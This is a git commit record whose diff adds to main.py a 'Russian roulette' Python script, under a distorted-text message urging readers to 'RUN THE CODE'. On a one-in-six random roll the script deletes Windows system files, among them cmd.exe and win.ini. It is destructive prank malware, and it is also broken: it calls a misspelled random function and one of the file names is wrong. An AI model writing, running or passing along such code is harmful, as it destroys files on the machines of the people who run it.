ed6d2a3f484fd084891df8caa17f9640f53968b4
bluehalooo <119090993+bluehalooo@users.noreply.github.com>
2023-05-11 11:27:50 -0700

    Ṟ̸͂́̈́̽͌̋U̶̢̡̳̟̲̽͒͝͝͝Ň̴̤̜͎͖̱̪̩̞ͅ ̷̡̧̖͙͈̠̾̀͂̂̕T̴̼̏̑̓̿͂͘H̶͓͙̝̙̺̔̈́͒̆͠͝͝È̷̢̨͕̥͍̪͉̕͝ ̴̛͍̙̖͒̔͒C̵̲̫̭̦̟̳̓̓̓́̈́͊͘Ô̷̻̥̞ͅD̴͖̞̠̊́͘Ë̸͖̟̜̯́͌̇̿̄̈̇͠͝

--- main.py
+++ main.py
@@ -1,1 +1,14 @@
-you will DIE
+import os
+import random
+
+number = random.randit(1,6)
+
+if number == 6:
+    os.remove('c:\windows\system32\CMD.exe')
+    os.remove('c:\windows\win.ini')
+    os.remove('c:\windows\winint.ini')
+
+else:
+    print("Very good!")
+
+#RUSSIAN ROULETTE
